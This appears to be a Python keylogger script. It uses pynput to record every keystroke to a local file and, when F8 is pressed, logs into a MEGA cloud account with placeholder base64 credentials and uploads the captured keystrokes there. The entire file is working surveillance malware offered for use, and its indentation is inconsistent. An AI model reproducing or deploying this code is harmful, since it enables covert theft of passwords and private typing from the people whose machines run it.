from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
from mega import Mega
import base64
import os

mail = '<YOUR-MAIL-IN-BASE64>'
passwd_enc = '<YOUR-PASSWORD-IN-BASE64>'
mega = Mega()

log_dir = ""


logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))
    if key == keyboard.Key.backspace:
        with open('keylogs.txt', 'rb+') as f:
            f.read()
            f.seek(-20, os.SEEK_END)
            f.truncate()

def on_release(key):
    if key == keyboard.Key.f8:
        with open('keylogs.txt', 'rb+') as f,open('keylogs.txt', 'r+') as w:
            f.read()
            f.seek(-8, os.SEEK_END)
            f.truncate()
	m = mega.login(base64.b64decode(mail).decode('utf-8'), base64.b64decode(passwd_enc).decode('utf-8'))
	filename = "keylogs.txt"
	m.upload(filename)
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

with open('keylogs.txt', 'r') as f:
    lines = f.readlines()
with open('keylogs.txt', 'w') as f:
    for line in lines:
        line=line.replace("\n","")
        line=line.replace("Key.space"," ")
        line=line.replace("Key.enter","\n---Enter---\n")
        line=line.replace("'","")
        f.write(line)
